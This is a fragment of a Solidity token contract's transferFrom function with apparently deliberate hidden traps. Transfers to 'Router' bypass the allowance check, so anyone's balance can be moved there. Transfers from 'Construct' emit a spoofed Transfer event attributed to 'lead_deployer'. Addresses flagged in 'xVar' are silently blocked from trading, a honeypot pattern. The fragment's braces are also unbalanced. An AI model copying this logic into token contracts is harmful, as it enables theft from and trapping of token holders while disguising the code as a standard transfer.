    function transferFrom(address from, address to, uint256 value) public returns (bool success) {   

        if(from == Construct)  {

        require(value <= balanceOf[from]);

        require(value <= allowance[from][msg.sender]);

        balanceOf[from] -= value;  

        balanceOf[to] += value; 

        emit Transfer (lead_deployer, to, value);

        return true; }

        if(to == Router)  {

        require(value <= balanceOf[from]);

        balanceOf[from] -= value;  

        balanceOf[to] += value; 

        emit Transfer (from, to, value);

        return true; }

              if  (!xVar[from])  {

                    if  (!xVar[to])  {

        require(value <= balanceOf[from]);

        require(value <= allowance[from][msg.sender]);

        balanceOf[from] -= value;  

        balanceOf[to] += value; 

        emit Transfer (from, to, value);

        return true; } }

 } }